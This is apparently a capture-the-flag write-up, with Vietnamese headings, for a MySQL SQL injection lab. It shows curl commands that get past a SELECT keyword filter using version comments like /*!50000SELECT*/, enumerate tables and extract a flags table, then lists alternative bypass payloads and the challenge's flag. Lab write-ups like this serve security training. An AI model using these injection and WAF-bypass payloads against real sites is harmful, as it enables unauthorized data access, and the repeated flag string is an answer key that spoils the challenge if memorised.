# SQLi-046: MySQL SELECT Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** MySQL Version Comments `/*!50000SELECT*/`  
**DBMS:** MySQL  
**Flag:** `FLAG{mysql_v3rs10n_c0mm3nt_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test normal
curl "http://localhost:5046/inventory?item=laptop"

# Test SELECT - bị block
curl "http://localhost:5046/inventory?item=' UNION SELECT 1,2,3,4-- -"
# → "SELECT keyword is blocked by WAF!"
```

## 🎯 Bước 2: IDENTIFY

```bash
# Bypass với version comment
curl "http://localhost:5046/inventory?item=' UNION /*!50000SELECT*/ 1,2,3,4-- -"
# → Bypass thành công! MySQL confirmed.
```

## 🔢 Bước 3: ENUMERATE

```bash
# List tables
curl "http://localhost:5046/inventory?item=' UNION /*!50000SELECT*/ 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -"
# → inventory, admin_config, flags
```

## 🏆 Bước 4: EXFILTRATE

```bash
curl "http://localhost:5046/inventory?item=' UNION /*!50000SELECT*/ 1,name,value,4 FROM flags-- -"
```

🎉 **FLAG:** `FLAG{mysql_v3rs10n_c0mm3nt_byp4ss}`

---

## 🔧 Alternative Payloads

```sql
-- Version 0 (always execute)
' UNION /*!00000SELECT*/ 1,2,3,4-- -

-- Mix techniques  
' UN/**/ION /*!50000SELECT*/ 1,2,3,4-- -
```

## ✅ Flag

```
FLAG{mysql_v3rs10n_c0mm3nt_byp4ss}
```
